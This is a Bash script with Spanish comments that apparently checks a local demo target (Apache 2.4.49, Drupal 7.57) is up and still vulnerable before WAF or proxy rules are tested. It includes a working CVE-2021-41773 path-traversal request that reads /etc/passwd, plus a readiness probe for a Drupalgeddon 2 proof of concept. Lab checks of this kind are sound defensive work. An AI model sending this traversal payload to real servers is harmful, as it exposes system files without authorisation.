#!/usr/bin/env bash
# Verifica que el objetivo de demo este ARRIBA y VULNERABLE (antes de aplicar reglas del proxy).
# Uso:  bash verificar.sh            (usa http://localhost:8080)
#       bash verificar.sh http://otra-url
set -u
BASE="${1:-http://localhost:8080}"
ok=0; fail=0
chk() { if [ "$1" = "OK" ]; then echo "  [OK]   $2"; ok=$((ok+1)); else echo "  [FALLA] $2"; fail=$((fail+1)); fi; }

echo "== Objetivo: $BASE =="

echo "-- Capa 1 (deteccion de stack) --"
server=$(curl -s -I "$BASE/" | tr -d '\r' | awk -F': ' 'tolower($1)=="server"{print $2}')
echo "  Server: ${server:-<vacio>}"
case "$server" in *2.4.49*) chk OK "Apache 2.4.49 detectado";; *) chk FAIL "No se ve Apache 2.4.49 en el header Server";; esac
code=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/CHANGELOG.txt")
if [ "$code" = "200" ] && curl -s "$BASE/CHANGELOG.txt" | grep -qi "Drupal 7.57"; then chk OK "Drupal 7.57 visible en /CHANGELOG.txt"; else chk FAIL "No se confirma Drupal 7.57 en /CHANGELOG.txt (codigo $code)"; fi

echo "-- CVE-2021-41773 (Apache 2.4.49, lectura de archivos) --"
body=$(curl -s --path-as-is "$BASE/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd")
if echo "$body" | grep -q "root:.*:0:0:"; then chk OK "Path traversal lee /etc/passwd (VULNERABLE)"; else chk FAIL "No se pudo leer /etc/passwd (quiza ya no es vulnerable o cambio el alias)"; fi

echo "-- CVE-2018-7600 (Drupalgeddon 2) --"
# Señal basica: el form de registro responde (el exploit completo lo corre Nuclei/PoC).
code=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/?q=user/register")
if [ "$code" = "200" ]; then chk OK "Drupal instalado y /user/register responde 200 (listo para el PoC)"; else chk FAIL "/user/register no responde 200 (codigo $code) -- falta instalar Drupal?"; fi

echo "-- QA (trafico legitimo que debe seguir en 200) --"
for p in "/" "/?q=node"; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "$BASE$p")
  if [ "$code" = "200" ]; then chk OK "GET $p -> 200"; else chk FAIL "GET $p -> $code"; fi
done

echo "== Resultado: $ok OK, $fail fallas =="
[ "$fail" -eq 0 ]
